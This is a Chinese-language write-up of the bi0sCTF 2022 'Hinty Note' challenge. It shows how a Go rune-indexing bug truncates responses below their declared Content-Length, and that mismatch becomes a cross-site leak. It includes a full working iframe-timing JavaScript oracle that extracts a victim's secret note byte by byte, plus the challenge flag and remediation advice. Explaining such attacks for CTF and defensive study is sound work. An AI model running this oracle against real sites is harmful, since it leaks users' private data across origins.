# bi0sCTF 2022 Hinty Note Writeup

## 题目简述

Hinty Note 把用户取回的笔记写入 HS256 JWT 的 `Note` 字段，并通过 `HttpOnly` Cookie 保存。`/search` 只允许查询“给定字符串是否为笔记前缀”：猜对时回显前缀，猜错时返回一段 hint。管理员环境的笔记是 flag，攻击者不能跨源读取正文，却可以利用错误的 `Content-Length` 在 iframe 中区分两条响应路径，逐字节恢复笔记。

仓库提供的 `poc2.html` 只是一份验证草稿：它复用同一个 iframe、在插入节点后才设置事件，并把 `printable[i+1]` 当作当前字符，存在竞争和下标偏移。下面按服务端源码重新整理为可复现的 XS-Leak。

## 解题过程

### 找到前缀判断分支

`/search` 从有效 JWT 中取出 `Note_Data.Note`，再比较：

```go
if searchValue == NoteData.Note[0:len(searchValue)] {
    retrieved := NoteData.Note[0:len(searchValue)]
    w.Header().Set("Content-Length", strconv.Itoa(len(retrieved)))
    w.Write([]byte(retrieved))
} else {
    contentLength := len(hint) + 5
    w.Header().Set("Content-Length", strconv.Itoa(contentLength))
    w.Write([]byte("Hint:" + givenHint))
}
```

直接跨源嵌入这个地址时，同源策略阻止攻击页读取响应内容，但不会阻止观察 iframe 是否按时完成加载。只要让错误分支产生不完整 HTTP 响应，就能把“候选是否为正确前缀”变成一位侧信道。

### 用 Unicode 制造 Content-Length 不一致

错误分支不是直接回显 `hint`，而是这样重建：

```go
for i := range hint {
    withHint += string(hint[i])
}
```

Go 对字符串执行 `range` 时，`i` 是每个 UTF-8 rune 的起始字节下标。若 hint 末尾放入 `世`，原字符串占 3 个 UTF-8 字节；循环只取其首字节 `0xE4`，再执行 `string(0xE4)`，得到两字节 UTF-8 编码的 `ä`。于是：

- 响应头仍按原 hint 的字节数计算 `Content-Length`；
- 实际错误响应比声明长度少 1 字节；
- 浏览器等待缺失字节，导航不能像正常响应一样及时完成；
- 正确前缀分支不使用 hint，声明长度与正文完全一致。

因此，可使用：

```text
hint=lengthasd世
```

作为稳定触发器。这里不是笼统的“Unicode 长度不同”，而是 `range` 产生字节下标、随后把单个首字节转换成 rune 的组合错误。

### 编写按字符推进的 iframe Oracle

攻击页面在持有目标 `token` Cookie 的管理员浏览器环境中执行。每个候选都创建新 iframe，并在挂载前注册 `onload`；在给定时间内正常加载代表前缀正确，超时代表错误分支的截断响应：

```html
<script>
const target = "http://localhost:2222";
const alphabet =
  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$()";

function isPrefix(candidate) {
  return new Promise(resolve => {
    const frame = document.createElement("iframe");
    frame.hidden = true;
    let settled = false;

    const finish = value => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      frame.remove();
      resolve(value);
    };

    frame.onload = () => finish(true);
    const timer = setTimeout(() => finish(false), 1500);
    frame.src = target + "/search?query=" + encodeURIComponent(candidate)
              + "&hint=" + encodeURIComponent("lengthasd世");
    document.body.appendChild(frame);
  });
}

(async () => {
  let known = "";
  while (!known.endsWith("}")) {
    let found = false;
    for (const ch of alphabet) {
      if (await isPrefix(known + ch)) {
        known += ch;
        console.log(known); // 实战中可把当前前缀发往自己的收集端
        found = true;
        break;
      }
    }
    if (!found) throw new Error("alphabet 或超时参数不匹配");
  }
})();
</script>
```

超时值应根据机器人网络环境调整，并先用已知正确、错误前缀各测数次。目标 URL 在题目机器人内部是 `localhost:2222`；本地复现或不同部署应替换为管理员浏览器实际访问的源。

逐字符恢复后得到：

```text
bi0sCTF{1_h0p3_x5_l3ak_w0rK3d}
```

## 方法总结

这条 XS-Leak 不读取跨源正文，而是利用浏览器可观察的加载完成状态。漏洞成立需要三个条件：服务端提供前缀 Oracle、错误分支的 `Content-Length` 可被 Unicode 构造破坏、攻击页面能在携带受害者 Cookie 的浏览器上下文中嵌入目标。

修复时应删除手工设置的 `Content-Length`，让 Go `net/http` 根据实际字节自动生成；遍历字符串时也不能混用 rune 起始下标和单字节转换。更根本的做法是不要向跨源可触发端点暴露秘密前缀比较，并结合合适的 `SameSite`、frame 限制与 CSP 缩小 XS-Leak 面。
